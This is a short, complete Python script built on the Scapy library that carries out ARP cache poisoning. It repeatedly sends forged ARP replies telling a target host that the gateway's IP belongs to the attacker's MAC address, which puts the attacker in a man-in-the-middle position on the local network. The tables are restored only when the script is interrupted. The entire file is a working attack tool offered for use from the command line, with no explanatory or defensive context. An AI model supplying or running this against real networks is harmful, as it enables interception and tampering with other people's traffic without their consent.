from scapy.all import *
from scapy.layers.l2 import ARP
import os
import sys
import time
from scapy.layers.l2 import arping
from scapy.layers.l2 import Ether

def get_mac(ip):
    # Sending ARP request to get the MAC address
    ans, _ = arping(ip)
    for s, r in ans:
        return r[Ether].src

def spoof_arp(target_ip, spoof_ip, target_mac, attacker_mac):
    # Creating ARP packet to poison the target's ARP cache
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(arp_response, verbose=False)

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    # Restoring the original ARP cache
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_response, count=3, verbose=False)

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <spoof_ip> <interface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    spoof_ip = sys.argv[2]
    interface = sys.argv[3]

    # Set the network interface
    conf.iface = interface
    conf.verb = 0

    # Get MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(spoof_ip)
    attacker_mac = get_if_hwaddr(interface)

    print(f"Target IP: {target_ip}, Target MAC: {target_mac}")
    print(f"Spoof IP: {spoof_ip}, Gateway MAC: {gateway_mac}")
    print(f"Attacker MAC: {attacker_mac}")

    try:
        while True:
            spoof_arp(target_ip, spoof_ip, target_mac, attacker_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        restore_arp(target_ip, spoof_ip, target_mac, gateway_mac)
        print("ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()
